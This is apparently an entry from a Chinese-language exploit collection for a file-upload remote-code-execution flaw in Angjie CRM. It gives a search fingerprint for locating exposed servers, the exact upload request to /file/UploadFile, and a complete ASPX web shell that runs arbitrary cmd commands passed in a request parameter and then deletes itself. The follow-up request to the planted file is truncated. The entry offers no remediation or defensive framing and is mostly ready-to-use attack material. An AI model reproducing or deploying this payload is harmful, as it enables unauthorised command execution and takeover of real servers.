# 昂捷CRMUploadFile存在文件上传致RCE漏洞

- **系统**：昂捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="CheckSilverlightInstalled"`
- **请求**：`POST /file/UploadFile?fileinfo={'UploadUserNo':'0000','LastChunk':true,'FileName':'a1.aspx','IsUseMongdb':true,'UploadTime':'2025-06-18T12:11:56'} HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
POST /TempFileNew/0000_202506181211560000_a1.aspx HTTP/1.1
Host:
Conten…（脚本共 649 字，完整版见原文）
```
- **预期**：200　|　—